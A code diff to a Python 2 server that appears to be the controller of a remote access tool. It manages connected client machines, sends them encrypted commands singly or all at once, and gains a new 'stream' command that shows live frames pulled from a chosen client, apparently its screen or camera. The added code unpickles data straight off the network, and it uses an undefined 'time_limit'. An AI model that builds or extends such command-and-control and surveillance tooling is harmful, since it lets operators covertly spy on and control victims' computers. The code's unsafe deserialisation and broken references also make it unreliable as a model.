@@ -52,18 +52,19 @@ import pickle
 import socket
 import select
 import struct
+import base64
 import requests
 import tempfile
 import threading
 import subprocess
 import socketserver
-from base64 import b64encode, b64decode
+
 
 
 # globals
 
-debug                   =True
-exit_status             =False
+debug = True
+exit_status = False
 socket.setdefaulttimeout(None)
 
 HELP_CMDS   = ''' 
@@ -96,6 +97,7 @@ class Server(threading.Thread):
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
+            'stream'        :   self.stream_client,
 	    'sendall'	    :   self.sendall_clients,
             'usage'         :   self.usage,
             '--help'        :   self.usage,
@@ -180,10 +182,10 @@ class Server(threading.Thread):
                 result.append(output)
             except Exception as e:
                 print str(e)
-        return b64encode(''.join(result))
+        return base64.b64encode(''.join(result))
 
     def _decrypt(self, data, dhkey):
-        blocks = self._block(b64decode(data))
+        blocks = self._block(base64.b64decode(data))
         result = []
         vector = blocks[0]
         for block in blocks[1:]:
@@ -337,6 +339,41 @@ class Server(threading.Thread):
             if output and len(output):
                 print output
 
+    def stream_client(self, client_id=None):
+        if not client_id:
+            if not self.current_client:
+                return 'No Client selected'
+            client  = self.current_client
+        else:
+            if int(client_id) not in self.clients:
+                return 'Invalid Client ID'
+            client  = self.clients[int(client_id)]
+        header_size = struct.calcsize("L")
+        window_name = client.addr[0]
+        print '\npress <space> any time to stop ...\n'
+        cv2.namedWindow(window_name)
+        data = ""
+        try:
+            while True:
+                while len(data) < header_size:
+                    data += client.conn.recv(4096)
+                packed_msg_size = data[:header_size]
+                data = data[header_size:]
+                msg_size = struct.unpack("L", packed_msg_size)[0]
+                while len(data) < msg_size:
+                    data += client.conn.recv(4096)
+                frame_data = data[:msg_size]
+                data = data[msg_size:]
+                frame = pickle.loads(frame_data)
+                cv2.imshow(window_name, frame)
+                key = cv2.waitKey(20)
+                if key == 32:
+                    break
+                elif time.time() > time_limit:
+                    break
+        finally:
+            cv2.destroyAllWindows()
+
 
 class ConnectionHandler(threading.Thread):
     global server
@@ -345,6 +382,7 @@ class ConnectionHandler(threading.Thread):
 
     def __init__(self, conn, addr, name):
         super(ConnectionHandler, self).__init__()
+        self.prompt = None
         self.conn   = conn
         self.addr   = addr
         self.name   = name
@@ -356,14 +394,15 @@ class ConnectionHandler(threading.Thread):
         while True:
             if exit_status:
                 break
-            method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
             self.lock.wait()
+            method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
             if 'prompt' in method:
                 command = raw_input(data % int(self.name))
                 cmd, _, action = command.partition(' ')
                 if cmd in server.commands:
                     result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
-                    print result
+                    if result:
+                        print result
                     return self.run(prompt=data)
                 else:
                     server.send_client(command, self.name)
